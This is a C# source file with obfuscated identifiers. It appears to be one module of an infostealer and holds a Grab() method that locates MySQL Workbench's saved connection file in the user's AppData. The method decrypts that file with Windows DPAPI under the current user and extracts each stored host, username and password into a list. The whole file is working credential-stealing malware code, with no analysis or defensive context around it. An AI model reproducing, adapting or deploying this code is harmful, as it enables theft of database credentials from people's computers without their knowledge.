using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text.RegularExpressions;
using C6Zy;
using reJu9lk2r;

namespace rk937aHHc
{
	public class MysqlWorkbench : EtbH
	{
		public MysqlWorkbench()
		{
			this.jjQlgoQp = "MysqlWorkbench";
		}

		public string jjQlgoQp { get; set; }

        public List<WTitxI2m> Grab()
        {
            List<WTitxI2m> list = new List<WTitxI2m>();

            string path = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "MySQL\\Workbench\\workbench_user_data.dat"
            );

            if (!File.Exists(path))
                return list;

            try
            {
                string decrypted = GHbU7Rc.ZDzD1h(
                    File.ReadAllBytes(path),
                    DataProtectionScope.CurrentUser
                );

                string[] lines = decrypted.Split('\n');

                foreach (string line in lines)
                {
                    if (string.IsNullOrWhiteSpace(line))
                        continue;

                    try
                    {
                        string firstPart = Regex.Split(line, Convert.ToString('\u0002'))[0];
                        string rest = line.Replace(firstPart, "").Trim('\u0002');

                        string host = firstPart.Split('@')[1];

                        string username = Regex.Split(rest, Convert.ToString('\u0003'))[0];
                        string password = Regex.Split(rest, Convert.ToString('\u0003'))[1];

                        list.Add(new WTitxI2m
                        {
                            data1 = host,
                            data2 = username,
                            data3 = password,
                            data4 = this.jjQlgoQp
                        });
                    }
                    catch
                    {
                    }
                }
            }
            catch
            {
            }

            return list;
        }
    }
}
